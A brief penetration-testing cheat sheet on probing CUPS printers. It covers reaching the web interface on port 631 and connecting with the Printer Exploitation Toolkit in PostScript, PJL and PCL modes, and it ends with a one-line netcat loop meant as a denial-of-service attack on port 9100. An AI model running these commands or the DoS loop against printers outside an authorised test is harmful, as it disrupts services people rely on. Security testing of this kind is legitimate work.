## Access in Web Browser

The CUPS server can be able to access via browser.  
Try input the following in the URL search form in browser.

```txt
http://<target-ip>:631
```

<br />

## Connect

**[The Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET)** is a tool for printer secure testing. Assume that we use it.  
Try all three options until the target printer recognized.

```sh
# ps: PostScript
python2 pret.py <target-ip>:631 ps

# pjl: Printer Job Language
python2 pret.py <target-ip>:631 pjl

# pcl: Printer Control Language
python2 pret.py <target-ip>:631 pcl
```

<br />

## Commands in PRET Shell

After connecting the target printer, we can test using the following commands.

```sh
# Print usage
> ?
> ? <command>
```

<br />

## Other Exploits

### Denial of Service (DoS)

```sh
while true; do nc printer 9100; done
```
